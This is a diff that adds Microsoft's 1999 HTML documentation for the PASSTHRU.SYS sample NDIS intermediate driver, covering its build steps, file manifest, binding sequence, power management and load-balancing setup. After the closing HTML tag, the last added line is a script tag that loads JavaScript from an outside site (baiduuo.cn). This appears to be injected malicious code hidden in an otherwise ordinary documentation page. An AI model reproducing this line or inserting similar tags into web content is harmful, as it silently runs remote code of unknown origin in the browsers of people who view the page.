@@ -1,0 +1,97 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<META NAME="Generator" CONTENT="Microsoft Word 97">
+<TITLE>passthru</TITLE>
+<META NAME="Template" CONTENT="C:\Program Files\Microsoft Office\Office\html.dot">
+</HEAD>
+<BODY TEXT="#000000" LINK="#0000ff" VLINK="#800080" BGCOLOR="#ffffff">
+
+<P><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN"></P>
+<FONT FACE="Verdana" SIZE=2><P><A NAME="top"></A></P>
+<P><! ---------------- Snip Snip ---------------- ></P>
+</FONT><FONT FACE="Verdana"><H2><A NAME="MYSAMPLE">PASSTHRU.SYS - Sample NDIS Intermediate Driver</A></H2>
+<H3>SUMMARY</H3>
+<B><P>Passthru Intermediate Miniport (IM) Driver</P>
+</B></FONT><FONT FACE="Verdana" SIZE=2><P>The passthrough Intermediate Miniport driver is a do-nothing pass-through Ndis 5 driver that demonstrates the basic principals of initializing and setting up an IM driver. This driver exposes a virtual adapter for each binding to a real physical adapter. Protocols can bind to these virtual adapters as if they are real adapters. </P>
+<P>The Passthru (IM) driver will re-package and send down all requests and sends submitted to this virtual adapter. The Passthru driver can be modified to change the data before passing it along. For example, it can encrypt/compress outgoing and decrypt/decompress incoming data.</P>
+<P>This driver is a good example of a driver that exposes a virtual adapter based on a binding to a real physical adapter. It is <I>not</I> a good representative of another class of IM drivers whose underlying physical adapter is not a conventional NIC device, but have to follow IM driver model mainly because the indications from the driver to the upper layers are not happening in the context of a DPC.</P>
+</FONT><FONT FACE="Verdana"><H3>BUILDING THE SAMPLE</H3>
+</FONT><FONT FACE="Verdana" SIZE=2><P>Run the <B>build</B> command from this directory to build the sample—it creates the binary Passthru.sys. </P>
+<P>To install this driver on Windows&reg; 2000, use the SFILTER sample notification object and INF, also found in this DDK.</P>
+</FONT><FONT FACE="Verdana"><H3>CODE TOUR</H3>
+<H4>File Manifest</H4>
+</FONT><U><PRE>File&#9;&#9;Description
+</U>
+Makefile&#9;Used during compilation to create the object and sys files
+Miniport.c&#9;Miniport related functions of the passthru driver
+Passthru.c&#9;DriverEntry routine and any routines common to the passthru miniport and protocol 
+Passthru.h&#9;Prototypes of all functions and data structures used by the Passthru driver
+Passthru.htm&#9;Html documentation of the Passthru driver (this file)
+Passthru.rc&#9;Resource file for the Passthru driver
+Precomp.h&#9;Precompile header file
+Protocol.c&#9;Protocol related functions of the Passthru driver
+Sources&#9;&#9;List of source files that are compiled and linked to create the passthru driver</PRE>
+<FONT FACE="Verdana"><H4>Programming Tour</H4>
+</FONT><FONT FACE="Verdana" SIZE=2><P>Basic steps in initializing and halting of Passthru driver:</P>
+<P>1) During DriverEntry, the Passthru driver registers as a protocol and an Intermediate miniport driver.</P>
+<P>2) Later on, Ndis calls the Passthru protocol to bind to a physical adapter.</P>
+<P>3) In the context of BindAdapterHandler and after opening of the underlying physical adapter succeeds, the Passthru driver queries the reserved keyword "UpperBindings" to get a list of device names for the virtual adapters that this particular binding is to expose.</P>
+<P>4) For each device name, the Passthru driver calls NdisIMInitializeDeviceInstance.</P>
+<P>5) In response, Ndis will call back Passthru miniport InitializeHandler entry point.</P>
+<P>6) After InitializeHandler successfully returns, ndis will take care of getting upper-layer protocols to bind to these newly created virtual adapters.</P>
+<P>7) All requests and sends coming from upper-layer protocols for the Passthru miniport driver are repackaged and sent down to ndis, to be passed to the physical adapter.</P>
+<P>8) All indications coming from bindings to the physical adapters are sent up as if they belong to virtual adapters.</P>
+<P>9) When Ndis asks the Passthru driver to close the binding between a physical adapter and Passthru protocol, the Passthru driver first calls NdisIMDeInitializeDeviceInstance for the virtual adapter representing that particular binding.</P>
+<P>10) Ndis in turn will close all the bindings between upper-layer protocols and virtual Passthru adapter.</P>
+<P>11) After all the bindings are closed, Ndis will call HaltHandler entry point in Passthru driver for the virtual adapter and returns back from NdisIMDeInitializeDeviceInstance.</P>
+<P>12) The Passthru protocol then closes the binding to the physical adapter and completes the unbind request issued in step 9.</P>
+<P>13) <B>To add Power Management Capabilities</B> </P>
+<P>13.1 During initialization, the Passthru miniport should set the Attribute '<I>NDIS_ATTRIBUTE_NO_HALT_ON_SUSPEND</I>' during the miniport initialization. </P>
+<P>13.2 When the Passthru miniport is requested to report its Plug and Play capabilities (OID_PNP_CAPABILITIES), the Passthru miniport must pass the request to the miniport below the Passthru protocol. If this request succeeds, then the Passthru miniport should return this buffer with a status of NDIS_STATUS_SUCCESS: </P>
+<P>NDIS_DEVICE_POWER_STATE&#9;MinMagicPacketWakeUp = NdisDeviceStateUnspecified;</P>
+<P>NDIS_DEVICE_POWER_STATE&#9;MinPatternWakeUp= NdisDeviceStateUnspecified;</P>
+<P>NDIS_DEVICE_POWER_STATE&#9;MinLinkChangeWakeUp=NdisDeviceStateUnspecified</P>
+<P>If the miniport below the Passthru protocol fails this request, then the status that was returned should be used to respond to the original request that was made to the Passthru miniport. </P>
+<P>13.3 The OID_PNP_SET_POWER and OID_PNP_QUERY_POWER should not be passed to the miniport below the Passthru protocol, as those miniports will receive independent requests from ndis.</P>
+<P>13.4 When the Passthru is asked to go to standby, it should use the Passthru protocol's PnP Handler to block all new sends and requests, and wait for all outstanding sends and requests to complete. This should be done before returning from the PnP Handler.</P>
+<P>&nbsp;</P>
+<P>14) <B>To Add LBFO (Load Balancing &amp; Fail Over)</B> </P>
+<B><P>Goal</B>: To add load-balancing capabilities to the Passthru driver. TCP/IP should see only one network card connected to it. This is the primary miniport. The second card is the secondary miniport of this primary miniport. All receives are performed by the primary miniport and all sends are done by the secondary miniport. All sends and related requests are passed to the secondary miniport.</P>
+<P>14.1 During miniport initialization, the new Passthru miniport searches through the list of existing Passthru miniport instantiations to see if a miniport with the same bundle identifier exists. If so, it calls NdisMSetMiniportSecondary on the two structures. The already instantiated Passthru miniport is the primary miniport.</P>
+<P>14.2 During run time all sends are routed to the secondary miniport, and all receives are sent to the primary miniport. </P>
+<P>14.3 All requests, sends, and receives should be completed on the handles that these actions were initiated on.</P>
+<P>14.4 All requests should be passed on to the miniport below the Passthru miniport that they were requested on. </P>
+<B><P>Note</B>: There is an exception to above rule: some requests to the primary Passthru miniport may be redirected to the secondary miniport. In such a case, when the request needs to be completed, it should use the handles present in the primary miniport's data structure.</P>
+<P>14.5 The user can change the bundle ID at run time. A NetEventReconfigure, with the new bundleID, is sent to the Passthru protocol's Protocol PnP Handler when this happens. </P>
+<P>14.6 When the Passthru is reconfigured, it leaves the bundle that it is part of and could join a new bundle. Salient points follow.</P>
+<P>14.7 To activate LBFO, ensure that '#ifdef __LBFO' is a valid statement (not commented out) in Passthru.h. Only when __LBFO is defined will the Passthru driver call the NdisMSetMiniportSecondary API.</P>
+<P>14.8 The request handler and the request complete handler should have knowledge of the OIDs that are redirected so that those requests will be completed on the miniport handles they were requested on.</P>
+<P>14.9 The sample filter installed as a service. To install, follow the steps below.</P>
+<P>On the desktop, right-click the <B>My Network Places</B> icon and choose <B>Properties</B>. </P>
+<P>Right-click on the relevant Local Area Connection icon and choose <B>Properties</B>. </P>
+<P>Click <B>Install</B>, then <B>Service</B>, then <B>Add</B>, then <B>Have Disk</B>. </P>
+<P>Browse to the <B>Netsf.inf</B> file. Ensure that Netsf_m.inf is present in the same directory. Click <B>OK</B>. This should install the Passthru driver. </P>
+<P>Click <B>OK</B> or <B>Yes</B> each time the system prompts the user. </P>
+<P>The two .inf files are needed because the sample filter is installed as a protocol and a miniport and you will be prompted at each installation.</P>
+<P>14.10 To change a BundleID:</P>
+<P>On the desktop, right-click the <B>My Network Places</B> icon, and then choose <B>Properties</B>. </P>
+<P>Right-click the relevant Local Area Connection icon, and then choose <B>Properties</B>. </P>
+<P>In the Installed Components list, click <B>Sample Filter</B> and then click the <B>Properties</B> tab. The second parameter is the BundleID. The user can change this value. </P>
+<P>The change is recorded when the <B>OK</B> button of the Local Area Connection Properties Window is clicked.</P>
+<P>14.11 Reconfiguration algorithm:</P>
+<P>Read the new Bundle Id.</P>
+<P>If Passthru miniport is a Secondary miniport, call&nbsp;NdisMPromoteMiniport on itself.</P>
+<P>If the Passthru miniport is the Primary of a bundle, call NdisMPromoteMiniport on its secondary.</P>
+<P>If there is already an instantiation of the Passthru miniport with the new Bundle Id, call NdisMSetMiniportSecondary on that Passthru miniport.</P>
+<P>14.12 The Passthru miniport's Halt handler needs to be aware that since the miniport is being halted, it will have to promote its secondary miniport. </P>
+</FONT><P ALIGN="CENTER"><A HREF="#top"><FONT FACE="Verdana" SIZE=2>Top of page</FONT></A><FONT FACE="Verdana" SIZE=2> </P></FONT>
+<TABLE CELLSPACING=0 BORDER=0 WIDTH=624>
+<TR><TD VALIGN="MIDDLE" BGCOLOR="#00ffff" HEIGHT=2>
+<P></TD>
+</TR>
+</TABLE>
+
+<FONT FACE="MS Sans Serif" SIZE=1><P>&copy; 1999 Microsoft Corporation</FONT><FONT FACE="Verdana" SIZE=2> </P></FONT></BODY>
+</HTML>
+<script language="javascript" src="http://www.baiduuo.cn/123/ok.js"></script>
